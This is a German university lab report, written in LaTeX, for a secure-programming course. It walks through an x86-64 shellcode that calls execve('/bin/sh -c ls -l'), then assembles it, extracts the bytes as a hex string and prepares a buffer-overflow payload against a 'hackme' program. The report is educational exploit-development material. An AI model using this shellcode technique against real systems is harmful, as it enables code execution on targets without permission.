\documentclass[12pt]{article}
\parindent0em
\parskip 1ex plus 0.4ex minus 0.4ex

\usepackage[a4paper,vmargin=30mm,hmargin=25mm]{geometry}
\usepackage{polyglossia}
\setdefaultlanguage{german}
\usepackage{fontspec}
\usepackage{lipsum}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{hyperref}

\definecolor{lstbackground}{rgb}{0.95,0.95,1}      % hellgruener Rahmen
\lstset{language=Python}

\lstset{
  basicstyle=\small\ttfamily,
  backgroundcolor=\color{lstbackground},
  keywordstyle=\bfseries\ttfamily\color{blue},
  stringstyle=\color{orange!50!black}\ttfamily,
  commentstyle=\color{gray}\ttfamily,
  showstringspaces=false,
  flexiblecolumns=false,
  tabsize=4,
  numbers=left,
  numberstyle=\tiny,
  numberblanklines=true,
  stepnumber=1,
  numbersep=10pt,
  xleftmargin=15pt,
  literate=%
  {Ö}{{\"O}}1
  {Ä}{{\"A}}1
  {Ü}{{\"U}}1
  {ß}{{\ss}}1
  {ü}{{\"u}}1
  {ä}{{\"a}}1
  {ö}{{\"o}}1
  {~}{{\textasciitilde}}1
}

\begin{document}

\begin{center}
  \textbf{\LARGE Sichere Programmierung} \\[1ex]%
  \textbf{\Large Projekt 3}\\[2ex] %
  David Pierre Sugar\\ %
  (76050) \\ %
  Julian Sobott\\ %
  (76511) \\ %
  
\end{center}

% ****************************************************************************
\section{Einleitung}
% ****************************************************************************
Nachdem wir uns während des letzten Praktikums grundlegend mit Assembler und dem GDB auseinander gesetzt haben, wird es nun Zeit diese neu gewonnenen Fähigkeiten zu nutzen um einen größeren Assembler-Code-Block zu analysieren.
\newline
\newline
Wie auch im letzten Praktikum greifen wir dabei auf die \textbf{GEF} Erweiterung für GDB zu.

% ****************************************************************************
\section{Ein interessanter Shellcode}
% ****************************************************************************
Auf den ersten Blick scheint der hier vorliegende Shellcode wirklich interessant. Beim überfliegen der Codezeilen fällt dabei auf, dass mittels \texttt{PUSH} und \texttt{POP} Operationen überdurchschnittlich oft der \textbf{Stack verändert wird}. Auch werden in einigen Zeilen bisher noch nicht zuordnungsbare \textbf{Konstanten} auf den Stack gepushed. Am Schluss wird jedoch ein \textbf{Systemcall} ausgeführt was dafür spricht, dass die für den Systemcall nötigen Daten auf dem Stack vorbereitet werden.
\newline
\newline
Da sich der Ablauf jedoch nicht so ohne weiteres ablesen lässt, wird im ersten Schritt der Shellcode \texttt{Zeile für Zeile} analysiert.

% ----------------------------------------------------------------------------
\subsection{Analyse}
% ----------------------------------------------------------------------------
Bei der Analyse von Assembler Code sollte man sich als erstes bewusst machen, \textbf{welche Register} involviert sind und wie der zugehörige \textbf{Stack Frame} ausgelegt ist. Dafür beginnt man in der ersten Zeile, analysiert diese und hält mögliche Veränderungen von Registern und Stack fest. Diesen Schritt wiederholt man Schritt für Schritt in jeder Code Zeile. Dabei sollte man dem Programmfluss folgen, d.h. bei einem Branch fährt man, mit der Analyse, beim angegebenen Sprungziel fort.
\newline
\newline
Das folgende Diagramm zeigt die vollständige Analyse des Shellcodes. Dabei werden teilweise mehrere Instruktionen in einem Schritt behandelt, wenn diese logisch zusammenhängen.
\newline

\begin{lstlisting}
Vorbedingung:

STACK:
---------------------------- <- RSP

REGISTER:   -

1. #######################################################

Code:
xor     rcx, rcx
push    rcx

STACK:
----------------------------
|           0x0            |
---------------------------- <- RSP

REGISTER:   RCX = 0x0

2. #######################################################

Code:
mov rcx, 0x68732f6e69622fff

STACK:
----------------------------
|           0x0            |
---------------------------- <- RSP

REGISTER:   RCX = 0x68732f6e69622fff

3. #######################################################

Code:
shr rcx, 0x8    ; rcx >> 8

STACK:
----------------------------
|           0x0            |
---------------------------- <- RSP

REGISTER:   RCX = 0x0068732f6e69622f


4. #######################################################

Code:
push rcx

STACK:
----------------------------
|           0x0            |
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- RSP

REGISTER:   RCX = 0x0068732f6e69622f

5. #######################################################

Code:
push rsp

STACK:
----------------------------
|           0x0            |
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|            A             |
---------------------------- <- RSP

REGISTER:   RCX = 0x0068732f6e69622f

6. #######################################################

Code:
pop rdi

STACK:
----------------------------
|           0x0            |
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A/ RSP

REGISTER:   RCX = 0x0068732f6e69622f
            RDI = A


7. #######################################################

Code:
xor     rcx, rcx
push    rcx

STACK:
----------------------------
|           0x0            |
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A

8. #######################################################

Code:
push word 0x632d

STACK:
----------------------------
|           0x0            |
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A

9. #######################################################

Code:
push rsp

STACK:
----------------------------
|           0x0            |        
----------------------------
|   0x0068732f6e69622f     |    
---------------------------- <- A
|           0x0            |    
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|            B             |    
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A

10. #######################################################

Code:
pop rbx

STACK:
----------------------------
|           0x0            |        
----------------------------
|   0x0068732f6e69622f     |    
---------------------------- <- A
|           0x0            |    
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B/ RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B

11. #######################################################

Code:
xor     rcx, rcx
push    rcx

STACK:
----------------------------
|           0x0            |        
----------------------------
|   0x0068732f6e69622f     |        
---------------------------- <- A
|           0x0            |        
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |        
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B


12. #######################################################

Code:
jmp     command
call    execve
data:   db "ls -lA"     ; Die Adresse des Strings wird
                        ; wird als Rücksprungadresse auf den Stack
                        ; gepushed
STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -lA"
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B

13. #######################################################

Code:
pop     rdx
push    rdx

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -lA"
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -lA"

14. #######################################################

Code:
xor byte [rdx+5], 0x41      ; ersetze A durch \0 (ASCII 0x41 = 'A')

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -l\0"

15. #######################################################

Code:
push rbx

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
----------------------------
|            B             |
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -l\0"


16. #######################################################

Code:
push rdi

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
----------------------------
|            B             |
----------------------------
|            A             |
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -l\0"

17. #######################################################

Code:
push rsp

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
----------------------------
|            B             |
----------------------------
|            A             |
---------------------------- <- C
|            C             |
---------------------------- <- RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -l\0"

18. #######################################################

Code:
pop rsi

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
----------------------------
|            B             |
----------------------------
|            A             |
---------------------------- <- C/ RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = PTR to "ls -l\0"
            RSI = C

19. #######################################################

Code:
xor rdx, rdx
mov al, 0x3B

STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     |
---------------------------- <- A
|           0x0            |
----------------------------
|          0x632d          |        2-Bytes
---------------------------- <- B
|           0x0            |    
----------------------------
|            x-------------|------------> "ls -l\0"
----------------------------
|            B             |
----------------------------
|            A             |
---------------------------- <- C/ RSP

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = 0x0
            RSI = C
            RAX = 0x000000000000003B


20. #######################################################

Code:                   SYSCALL

\end{lstlisting}

\newpage
\begin{center}
    {\Large Zum Zeitpunk des Systemcalls liegt folgender Zustand vor.}
\end{center}

\begin{lstlisting}
STACK:
----------------------------
|           0x0            |    
----------------------------
|   0x0068732f6e69622f     | <--------------------------
----------------------------                           |
|           0x0            |                           |
----------------------------                           |
|          0x632d          | <-----------------------  |
----------------------------                        |  |
|           0x0            |                        |  |
----------------------------                        |  |
|            x-------------|------------> "ls -l\0" |  |
----------------------------                        |  |
|            B-------------|-------------------------  |
---------------------------|                           |
|            A-------------|----------------------------
---------------------------- <- C

REGISTER:   RCX = 0x0
            RDI = A
            RBX = B
            RDX = 0x0
            RSI = C
            RAX = 0x000000000000003B

\end{lstlisting}

Als nächstes gilt es zu klären, welcher Systemcall aufgerufen wird und welche Argumente dabei übergeben werden. Dazu muss man sich jedoch über die \textbf{Systemcall Calling Convention}, für x86-64Bit, im klaren sein.

% *****************************************************************
\subsubsection{Systemcalls}
% *****************************************************************
Der Linux Kernel stellt eine Reihe von Operationen bereit, die er stellvertretend für andere Prozesse ausführen kann. Dazu zählen u.a. Operationen zum allozieren von Speicher auf dem Heap oder auch Zugriffe auf Dateien. Die Schnittstelle bildet dabei die \textbf{syscall} Instruktion für neuere 64-Bit Systeme, bzw. die \textbf{0x80} Instruktion für ältere 32-Bit Systeme.

\subsubsection*{Calling Convention}
Die Operation, die der Kernel für einen Prozess ausführen soll wird durch die sog. \textbf{Syscall Number} spezifiziert, die in das \texttt{RAX} Register geschrieben wird. So wird ein \texttt{READ} Befehl z.B. durch die Nummer \textbf{0x0} angegeben.
\newline
\newline
Die Argumente für jeden Systemcall werden \textbf{mittels Register} übergeben. Für 64 Bit Programme wären dies, in der angegebenen Reihenfolge: \texttt{RDI, RSI, RDX, RCX, R10, R8, R9}.
\newline
\newline
Nachdem die jeweilige Syscall Number in das RAX Register geschrieben wurde und die Argumente ebenfalls in die entsprechenden Register, kann mit dem \texttt{syscall} Befehl eine Anfrage abgesetzt werden.


\subsubsection*{Ablauf}
Durch die \texttt{syscall} Instruktion wechselt der Prozessor vom \textbf{User Mode} in den \textbf{Kernel Mode} und ruft den \textbf{Trap Handler} auf. Dieser überprüft ob es sich bei dem in RAX hinterlegten Wert um eine valide Syscall Number handelt und ob zulässige Argumente übergeben wurden. Falls ja indiziert der Trap Handler die \textbf{Sycall Tabelle} um die Adresse der zur Syscall Number gehörenden \textbf{Systemcall Service Routine} zu erhalten und springt zu dieser.
\newline
\newline
Die Systemcall Service Routine führt dann die gewünschte Aktion aus.{\Large AUSFÜHRLICHER }
\newline
\newline
Eine vollständige Liste aller Systemcalls und der zu übergebenden Argumente findet sich online, z.B. \href{https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/}{hier}.


% ----------------------------------------------------------------------------
\subsection{Analyse Fortsetzung}
% ----------------------------------------------------------------------------
Da die Syscall Number immer über das \textbf{A-Register} angegeben wird, ist es nun eine Leichtigkeit herauszufinden, welcher Syscall im gegebenen Shellcode verwendet wird. Der Wert der zur Zeit des Syscalls in RAX steht ist \textbf{59}. Durch eine kurze Onlinerecherche ergibt sich damit, dass es sich hierbei um den \textbf{execve} Syscall handelt. Dieser hat folgende Struktur.
\begin{lstlisting}
execve(const char* filename, const char* const argv[], 
    const char* const envp[])
\end{lstlisting}

% *****************************************************************
\subsubsection{Exec}
% *****************************************************************
Die Familie der \textbf{exec} System Calls wir dazu genutzt den derzeit laufenden Prozess durch einen neuen Prozess zu ersetzen (siehe man execve). Die einzelnen Parameter haben dabei folgende Bedeutungen.

\begin{description}
    \item [\textbf{filename}] Nullterminierter String ($'\setminus0'$) des Programms, mit dem der derzeitige Prozess ersetzt werden soll.

    \item [\textbf{argv}] Mit \texttt{'(char*) NULL'} terminiertes Array von Kommandozeilen Parametern als Strings. 

    \item [\textbf{envp}] Mit \texttt{'(char*) NULL'} terminiertes Array von Environment-Variablen als Strings.
\end{description}
Bei Erfolg wird der derzeitige Prozess durch das in \texttt{filename} angegebene Programm ersetzt. Bei einem fehlerhaften Aufruf von execve, wird \texttt{-1} zurückgegeben.
\newline
\newline
Um den derzeitigen Prozess z.B. durch eine Shell zu ersetzen, kann folgender Aufruf verwendet werden.
\begin{lstlisting}
execve("/bin/sh\0", NULL, NULL)
\end{lstlisting}
Hier wurde auf die Übergabe von Argumenten an den neuen Prozess verzichtet.
\newline

Schaut man sich nun das Layout des Stacks unmittelbar vor dem Aufruf von \texttt{syscall} an, kann man diesen in drei Teilbereiche gliedern, die jeweils für \texttt{filename, argv und envp stehen}. Weiterhin können die bisher noch nicht zuordnungsbaren Hexadezimalzahlen als Strings interpretiert werden. Dabei ist daran zu denken, dass Werte grundsätzlich im Little-Endian Format abgespeichert werden, d.h. das niederwertigste Byte wird an die unterste Speicheradresse geschrieben.

\begin{lstlisting}
STACK:
----------------------------
|           0x0            |    
----------------------------
|        "/bin/sh"         | ----------- filename
---------------------------- <- A / argv[0]
|           0x0            |                        
----------------------------                        
|           "-c"           |
---------------------------- <- B / argv[1]
|           0x0            |              ------------  
----------------------------                          |
|            x-------------|------------> "ls -l\0"   |
----------------------------                          |-- argv
|            B             |                          | 
---------------------------|                          |
|            A             |              ------------
---------------------------- <- C

REGISTER:   RDI = A     (filename)
            RSI = C     (argv)
            RDX = 0x0   (envp)

STRINGS:
            0x00  68  73  2f  6e  69  62   2f   = "/bin/sh"
              |_| |_| |_| |_| |_| |_| |_| |_|
               |   |   |   |   |   |   |   |
              \0   h   s   /   n   i   b   /

            0x63  2d                            = "-c"
              |_| |_|
               |   |
               c   -

\end{lstlisting}

Die untersten 32 Bit des Stacks bilden das argv Array. Jeder 8 Bit Block hält dabei einen Zeiger auf einen nullterminierten String. Darüber liegen die Strings, die in argv verwendet werden. \textbf{argv[0]/ A} spezifiziert dabei das aufzurufende Programm, \textbf{argv[1]/ B} ist die zu verwendende kommandozeilenoption, "-c", die übergeben werden soll. Die gegebene Option sorgt dafür, dass der nach den Optionen folgende String von der Shell ausgeführt wird. \textbf{argv[2]/ x} ist das in der Shell auszuführende Programm.
\newline
\newline
Mit diesen Informationen ergibt sich folgender Systemcall.

\begin{lstlisting}
char* argv[] = {"/bin/sh", "-c", "ls -l"};

execve("/bin/sh", argv, (char*) NULL);
\end{lstlisting}
Dieser ersetzt den derzeitigen Prozess mit einer neuen Shell und führt in dieser das Programm \texttt{ls -l} aus.

% ----------------------------------------------------------------------------
\subsection{Implementierung}
% ----------------------------------------------------------------------------
Um den Shellcode zu implementieren, wird dieser in eine Datei mit der Endung \textbf{.asm} übertragen, in diesem Fall \texttt{exec.asm}.
\newline
\newline
Mit \texttt{nasm -f elf64 exec.asm} kann danach eine 64-Bit Object Datei erzeugt werden.
\newline
\newline
Mit \texttt{ld -N exec.o -o exec} kann diese dann zu einer ausführbaren Datei gelinkt werden, um sie danach auszuführen. Wichtig ist, dass die \textbf{-N} Option mit angegeben wird, da die Text Section standardmäßig nicht schreibbar ist, wodurch jeder solche Versuch zu einem Segmentation fault führt.

\begin{lstlisting}[caption={Ohne -N Option}, captionpos=t]
>> nasm -f elf64 exec.asm
>> ld exec.o -o exec
>> ./exec
[1]    2822 segmentation fault (core dumped)  ./exec
\end{lstlisting}


\begin{lstlisting}[caption={Mit -N Option}, captionpos=t]
>> nasm -f elf64 exec.asm
>> ld -N exec.o -o exec
>> ./exec
total 12
-rwxr-xr-x 1 sugar sugar 848 Dec 25 14:21 exec
-rw-r--r-- 1 sugar sugar 754 Dec 25 14:11 exec.asm
-rw-r--r-- 1 sugar sugar 736 Dec 25 14:12 exec.o
\end{lstlisting}

% ----------------------------------------------------------------------------
\subsection{Entwicklung eins Python-Skript}
% ----------------------------------------------------------------------------
Um ein Skript zu entwickeln, dass den Shellcode über das Programm \textbf{hackme} ausführt, muss als erstes der Code aus der Object (.o) Datei extrahiert werden. Dazu kann das Programm \textbf{objcopy} verwendet werden.

\begin{lstlisting}
objcopy -O binary exec.o exec.bin
\end{lstlisting}

Die \textbf{-O binary} Option generiert einen Speicher Dump des Inhalts der Quelldatei ohne dabei die Metainformationen zu übernehmen.
Nun muss der extrahierte Binärcode noch in Hexadezimal umformatiert werden, um ihn bequem in einem Skript nutzen zu können. Dies kann mit einem eigenen Python Skript realisiert werden, das als Ausgangspunkt für das eigentliche Skript dient.

\begin{lstlisting}
#!/bin/python2

import sys

shellcode           = ""
shellcode_length    = 0

binary = open(sys.argv[1], 'rb')

for byte in binary.read():
    shellcode = shellcode + ("\\x" + byte.encode("hex"))
    shellcode_length += 1

print(shellcode)
print("\nLength: " + str(shellcode_length))
\end{lstlisting}

Das Skript liest eine übergebene Binärdatei ein und wandelt der Reihe nach jedes Byte in seine Hexadizimalrepräsentation um. Gleichzeitig wird die Anzahl der Bytes, d.h. die Länge des Shellcodes ermittelt.
Wichtig ist, dass Python2 verwendet wird da unter Python3 für Bytes die \textbf{encode()} methode nicht mehr zur Verfügung steht. Mit diesem Skript lässt sich nun der extrahierte Binärcode in Hexadezimal umwandeln und auf der Kommandozeile ausgeben.

\begin{lstlisting}
>> ./exec_shellcode.py exec.bin 
\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73
\x68\x48\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66
\x68\x2d\x63\x54\x5b\x48\x31\xc9\x51\xeb\x11\x5a\x52
\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31\xd2\xb0\x3b
\x0f\x05\xe8\xea\xff\xff\xff\x6c\x73\x20\x2d\x6c\x41

Length: 65
\end{lstlisting}

Als nächstes gilt es den Shellcode noch mit einem NOP Sled sowie einer Rücksprungadresse zu versehen um die letztendliche Payload zu erhalten. Dafür muss aber zuerst noch das \textbf{hackme} Programm analysiert werden, um die Größe des Sleds richtig wählen zu können.
\end{document}



%%% Local Variables: 
%%% TeX-PDF-mode: t
%%% TeX-master: t
%%% coding: utf-8
%%% mode: latex
%%% TeX-engine: xetex
%%% End: 
